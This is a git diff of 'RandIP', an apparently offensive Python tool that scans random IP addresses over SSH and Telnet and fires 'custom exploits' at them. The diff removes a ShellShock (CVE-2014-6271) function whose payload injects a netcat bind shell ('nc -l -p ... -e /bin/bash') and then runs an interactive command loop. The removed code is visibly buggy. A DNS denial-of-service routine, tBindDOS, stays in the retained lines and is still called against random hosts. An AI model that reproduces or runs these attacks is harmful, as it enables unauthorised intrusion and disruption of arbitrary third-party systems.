@@ -1,4 +1,4 @@
-#RandIP 1.2.1 Stable#
+#RandIP 1.2.3 Stable#
 #Random IP Generator with Socket, SSH, Telnet, and HTML Screenshot support.#
 #Report bugs including uncontained exceptions to blmvxer@gmail.com#
 import socket, os, time, telnetlib, paramiko, requests, zipfile, stem.process, subprocess, sys, logging
@@ -134,30 +134,6 @@ def tBindDOS():
 	sock.sendto(payload, (address, 53))
 	print('Done.\n')
 
-def ShellShock():
-	rport=80
-	print('Using ShellShock CVE:2014-6271(6278)')
-	print(('Sending packet to ' + address + '...'))
-	payload = "() { :;}; /bin/bash -c 'nc -l -p "+rport+" -e /bin/bash &'"
-	try:
-		serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		time.sleep(1)
-		serversocket.connect(address)
-		print('[!] Successfully exploited')
-		print(('[!] Connected to ', address))
-		serversocket.settimeout(3)
-		while True:
-			reply = input(address+"> ")
-			serversocket.sendall(reply+"\n")
-			data = serversocket.recv(buff)
-			print(data)
-			print('Done.\n')
-	except exception.TypeError:
-		print('Exploit failed...\n')
-		pass
-	except:
-		print('Exploit failed...\n')
-		pass
 def SSHenum():
 	time.sleep(4)
 	global SSHsock
@@ -354,7 +330,6 @@ for address in randip():
 				print('SSH port not open...skipping\n')
 #Custom Exploits
 			tBindDOS()
-			ShellShock()
 #End of Exploits
 		except socket.timeout:
 			print((socket.timeout, '%s timeout' % address))
